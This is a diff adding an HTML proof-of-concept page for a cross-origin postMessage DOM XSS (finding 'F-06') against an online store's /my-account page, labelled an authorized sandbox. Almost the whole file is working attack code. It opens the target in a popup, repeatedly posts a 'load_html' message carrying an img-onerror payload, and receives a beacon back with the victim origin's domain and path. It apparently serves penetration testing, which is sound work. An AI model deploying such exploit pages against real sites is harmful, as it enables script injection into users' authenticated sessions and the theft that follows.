@@ -1,0 +1,65 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>F-06 manual PoC — attacker origin</title></head>
+<body style="font-family:sans-serif;max-width:820px;margin:30px auto">
+
+<h1>F-06 — postMessage DOM XSS (manual PoC)</h1>
+
+<p><b>Target (authorized sandbox):</b>
+<code>https://82qozx6gt920260612022927.sandbox.bamkounified.com</code></p>
+
+<p><b>Serve this file from a different origin</b> (you already are:
+<code>http://localhost:8000/attacker-manual.html</code>) — the cross-origin part is the whole point.</p>
+
+<ol>
+  <li>In <b>this same browser</b>, log into the store first (so you hold a live session).</li>
+  <li>Click <b>Launch exploit</b> below.</li>
+  <li>A popup opens <code>/my-account</code> (your authenticated session) and the injected
+      <code>alert('being-aman')</code> fires <b>in the store's origin</b>.</li>
+  <li>Dismiss the alert; the log below shows the cross-origin confirmation beacon.</li>
+</ol>
+
+<button id="go" style="font-size:20px;padding:10px 20px">Launch exploit</button>
+<pre id="log" style="background:#111;color:#0f0;padding:12px;margin-top:16px;white-space:pre-wrap"></pre>
+
+<script>
+const TARGET = "https://82qozx6gt920260612022927.sandbox.bamkounified.com";
+
+// The payload the operator asked for. onerror runs in the TARGET origin, inside the
+// victim's authenticated session, and posts document.domain back to us as proof.
+const PAYLOAD =
+  '<img src=x onerror="alert(\'being-aman\');' +
+  'if(window.opener)opener.postMessage(\'XSSFIRED::\'+document.domain+\'|\'+location.pathname,\'*\')">';
+
+const log = document.getElementById('log');
+
+// The target origin beacons back here once the payload executes over there.
+window.addEventListener('message', function (e) {
+  if (typeof e.data === 'string' && e.data.indexOf('XSSFIRED::') === 0)
+    log.textContent += '\n[+] CROSS-ORIGIN XSS fired in TARGET origin: ' + e.data;
+});
+
+document.getElementById('go').addEventListener('click', function () {
+  // load_html sink: $('#'+sectionName).html(data);  #loadsectionhere exists on every store page.
+  var w = window.open(TARGET + '/my-account', '_blank');
+  log.textContent = 'popup opened: ' + !!w + '   (attacker origin = ' + location.origin + ')' +
+                    '\nwaiting for the target to load and register its message listener...';
+
+  // Retry loop is REQUIRED: a single postMessage races cms-msg.js and gets dropped.
+  // Retry every 500ms for ~12s until the payload lands (or the beacon confirms it did).
+  var n = 0, done = false;
+  window.addEventListener('message', function (e) {
+    if (typeof e.data === 'string' && e.data.indexOf('XSSFIRED::') === 0) done = true;
+  });
+  var iv = setInterval(function () {
+    n++;
+    try {
+      w.postMessage({ action: 'load_html', sectionName: 'loadsectionhere', data: PAYLOAD }, '*');
+    } catch (e) {}
+    if (n > 24 || done) { clearInterval(iv); if (!done) log.textContent += '\n[i] retry loop finished'; }
+  }, 500);
+});
+</script>
+
+</body>
+</html>
